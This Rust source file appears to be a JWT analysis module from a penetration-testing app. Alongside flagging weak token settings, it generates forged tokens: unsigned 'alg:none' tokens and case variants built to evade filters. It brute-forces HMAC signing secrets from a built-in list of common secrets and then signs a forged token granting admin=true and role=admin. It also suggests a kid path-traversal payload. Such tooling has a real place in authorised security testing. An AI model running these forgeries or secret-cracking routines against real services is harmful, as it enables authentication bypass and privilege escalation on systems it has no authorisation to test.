use base64::engine::general_purpose::URL_SAFE_NO_PAD;
use base64::Engine;
use hmac::{Hmac, Mac};
use serde::{Deserialize, Serialize};
use sha2::{Sha256, Sha384, Sha512};
use crate::compat::{AppHandle, Emitter};

type HmacSha256 = Hmac<Sha256>;
type HmacSha384 = Hmac<Sha384>;
type HmacSha512 = Hmac<Sha512>;

#[derive(Debug, Clone, Serialize)]
pub struct JwtDecoded {
    pub header: serde_json::Value,
    pub payload: serde_json::Value,
    pub signature_b64: String,
    pub alg: String,
    pub issues: Vec<JwtIssue>,
    pub forgeries: Vec<JwtForgery>,
}

#[derive(Debug, Clone, Serialize)]
pub struct JwtIssue {
    pub severity: String,
    pub title: String,
    pub detail: String,
}

#[derive(Debug, Clone, Serialize)]
pub struct JwtForgery {
    pub attack: String,
    pub description: String,
    pub token: String,
}

fn b64_decode(s: &str) -> Option<Vec<u8>> {
    URL_SAFE_NO_PAD.decode(s).ok()
}

fn b64_encode(b: &[u8]) -> String {
    URL_SAFE_NO_PAD.encode(b)
}

fn parse(token: &str) -> Result<(serde_json::Value, serde_json::Value, String, String, String), String> {
    let parts: Vec<&str> = token.split('.').collect();
    if parts.len() != 3 {
        return Err("not a valid JWT (expected 3 parts)".into());
    }
    let h_bytes = b64_decode(parts[0]).ok_or("bad base64 header")?;
    let p_bytes = b64_decode(parts[1]).ok_or("bad base64 payload")?;

    let header: serde_json::Value =
        serde_json::from_slice(&h_bytes).map_err(|e| format!("header json: {e}"))?;
    let payload: serde_json::Value =
        serde_json::from_slice(&p_bytes).map_err(|e| format!("payload json: {e}"))?;

    Ok((
        header,
        payload,
        parts[2].to_string(),
        parts[0].to_string(),
        parts[1].to_string(),
    ))
}

fn sign_hmac(key: &[u8], signing_input: &str, alg: &str) -> Option<Vec<u8>> {
    match alg {
        "HS256" => {
            let mut mac = HmacSha256::new_from_slice(key).ok()?;
            mac.update(signing_input.as_bytes());
            Some(mac.finalize().into_bytes().to_vec())
        }
        "HS384" => {
            let mut mac = HmacSha384::new_from_slice(key).ok()?;
            mac.update(signing_input.as_bytes());
            Some(mac.finalize().into_bytes().to_vec())
        }
        "HS512" => {
            let mut mac = HmacSha512::new_from_slice(key).ok()?;
            mac.update(signing_input.as_bytes());
            Some(mac.finalize().into_bytes().to_vec())
        }
        _ => None,
    }
}

const COMMON_SECRETS: &[&str] = &[
    "secret", "password", "123456", "admin", "jwt", "jwt_secret", "jwtsecret",
    "key", "your-256-bit-secret", "my_secret", "default", "test", "changeme",
    "supersecret", "supersecretkey", "secretkey", "private", "MIIEvQIBA",
    "hmac_secret", "token_secret", "api_secret", "auth_secret",
];

#[derive(Debug, Clone, Deserialize)]
pub struct JwtRequest {
    pub token: String,
    pub wordlist: Option<Vec<String>>,
}

pub async fn jwt_analyze(app: AppHandle, req: JwtRequest) -> Result<JwtDecoded, String> {
    let (header, payload, sig, h_b64, p_b64) = parse(req.token.trim())?;

    let alg = header
        .get("alg")
        .and_then(|v| v.as_str())
        .unwrap_or("?")
        .to_string();

    let mut issues: Vec<JwtIssue> = Vec::new();
    let mut forgeries: Vec<JwtForgery> = Vec::new();

    // ==== ISSUES ====
    if alg.eq_ignore_ascii_case("none") {
        issues.push(JwtIssue {
            severity: "CRITICAL".into(),
            title: "alg:none".into(),
            detail: "server accepts unsigned tokens if this alg was negotiated".into(),
        });
    }

    if alg.starts_with("HS") {
        issues.push(JwtIssue {
            severity: "INFO".into(),
            title: "HMAC symmetric algorithm".into(),
            detail: "if secret is weak or algorithm confusion (HS vs RS) possible, token is forgeable".into(),
        });
    }

    if let Some(exp) = payload.get("exp").and_then(|v| v.as_i64()) {
        let now = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|d| d.as_secs() as i64)
            .unwrap_or(0);
        if exp < now {
            issues.push(JwtIssue {
                severity: "INFO".into(),
                title: "expired".into(),
                detail: format!("exp={exp}, now={now}"),
            });
        }
    } else {
        issues.push(JwtIssue {
            severity: "MEDIUM".into(),
            title: "no exp claim".into(),
            detail: "token does not expire — persistence risk".into(),
        });
    }

    if header.get("kid").is_some() {
        issues.push(JwtIssue {
            severity: "MEDIUM".into(),
            title: "kid present".into(),
            detail: "test for kid SQLi/path-traversal injection (e.g. `kid=../../../../dev/null`)".into(),
        });
    }

    if let Some(jku) = header.get("jku").and_then(|v| v.as_str()) {
        issues.push(JwtIssue {
            severity: "HIGH".into(),
            title: "jku header".into(),
            detail: format!("token fetches signing key from URL: {jku} — test host-header/SSRF bypass"),
        });
    }

    if let Some(x5u) = header.get("x5u").and_then(|v| v.as_str()) {
        issues.push(JwtIssue {
            severity: "HIGH".into(),
            title: "x5u header".into(),
            detail: format!("token references cert at URL: {x5u} — test spoofing"),
        });
    }

    // ==== FORGERIES ====

    // 1. alg:none forgery
    let none_header = serde_json::json!({ "alg": "none", "typ": "JWT" });
    let none_header_b64 = b64_encode(serde_json::to_string(&none_header).unwrap().as_bytes());
    let none_token = format!("{}.{}.", none_header_b64, p_b64);
    forgeries.push(JwtForgery {
        attack: "alg:none".into(),
        description: "empty signature with alg=none header".into(),
        token: none_token,
    });

    // 2. alg:NONE variant (case tricks)
    for variant in &["None", "NONE", "nOnE"] {
        let h = serde_json::json!({ "alg": variant, "typ": "JWT" });
        let h_b64 = b64_encode(serde_json::to_string(&h).unwrap().as_bytes());
        forgeries.push(JwtForgery {
            attack: format!("alg:{variant}"),
            description: "case-variation bypass for alg=none filters".into(),
            token: format!("{}.{}.", h_b64, p_b64),
        });
    }

    // 3. HMAC weak-secret bruteforce
    if alg.starts_with("HS") {
        let signing_input = format!("{}.{}", h_b64, p_b64);
        let expected_sig = b64_decode(&sig).unwrap_or_default();

        let wordlist: Vec<String> = req
            .wordlist
            .unwrap_or_default()
            .into_iter()
            .chain(COMMON_SECRETS.iter().map(|s| s.to_string()))
            .collect();

        let total = wordlist.len();
        let _ = app.emit("jwt:status", format!("bruteforcing HMAC secret ({total} candidates)..."));

        for (i, secret) in wordlist.iter().enumerate() {
            if let Some(computed) = sign_hmac(secret.as_bytes(), &signing_input, &alg) {
                if computed == expected_sig {
                    issues.push(JwtIssue {
                        severity: "CRITICAL".into(),
                        title: "weak HMAC secret".into(),
                        detail: format!("signing key recovered: \"{secret}\""),
                    });

                    // craft forged admin token
                    if let Some(mut forged_payload) = payload.as_object().cloned() {
                        forged_payload.insert("admin".into(), serde_json::json!(true));
                        forged_payload.insert("role".into(), serde_json::json!("admin"));
                        let forged_p_b64 = b64_encode(
                            serde_json::to_string(&forged_payload).unwrap().as_bytes(),
                        );
                        let forged_input = format!("{}.{}", h_b64, forged_p_b64);
                        if let Some(new_sig) = sign_hmac(secret.as_bytes(), &forged_input, &alg) {
                            forgeries.push(JwtForgery {
                                attack: format!("HMAC-forge ({secret})"),
                                description: "valid sig with admin=true / role=admin injected".into(),
                                token: format!("{}.{}", forged_input, b64_encode(&new_sig)),
                            });
                        }
                    }
                    break;
                }
            }
            if i % 50 == 0 {
                let _ = app.emit("jwt:progress", serde_json::json!({"done": i, "total": total}));
            }
        }
        let _ = app.emit("jwt:progress", serde_json::json!({"done": total, "total": total}));
    }

    let _ = app.emit("jwt:done", serde_json::json!({"issues": issues.len(), "forgeries": forgeries.len()}));

    Ok(JwtDecoded {
        header,
        payload,
        signature_b64: sig,
        alg,
        issues,
        forgeries,
    })
}
